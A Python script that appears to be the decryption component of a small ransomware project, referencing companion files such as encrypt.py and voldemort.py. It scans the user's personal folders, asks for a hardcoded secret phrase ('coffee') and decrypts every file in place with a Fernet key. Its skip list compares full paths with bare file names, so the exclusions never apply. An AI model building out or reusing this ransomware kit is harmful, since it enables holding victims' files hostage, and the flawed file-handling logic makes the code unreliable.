import os
from cryptography.fernet import Fernet

# Define the list of directories to be traversed
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]

# Initialize an empty list to store all the files in the specified directories
files = []

# Traverse each directory and subdirectory to get all files
for directory in directories:
    for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
        for filename in filenames:
            files.append(os.path.join(root, filename))

print(files)

# Read the secret key from the file
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

# Get the secret phrase
secret_phrase = "coffee"

# Ask for user input for the secret phrase
user_phrase = input("Enter the secret phrase to decrypt your files\n")

forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]

# If the user input matches the secret phrase, perform decryption
if user_phrase == secret_phrase:
    # Loop through each file in the list and decrypt using the key
    for file in files:
        if file in forbidden_files:
            continue
        with open(file, "rb") as file_to_decrypt:
            encrypted_content = file_to_decrypt.read()
        decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
        with open(file, "wb") as decrypted_file:
            decrypted_file.write(decrypted_content)
    print("Decryption completed.")
else:
    print("Incorrect phrase! Decryption aborted.")
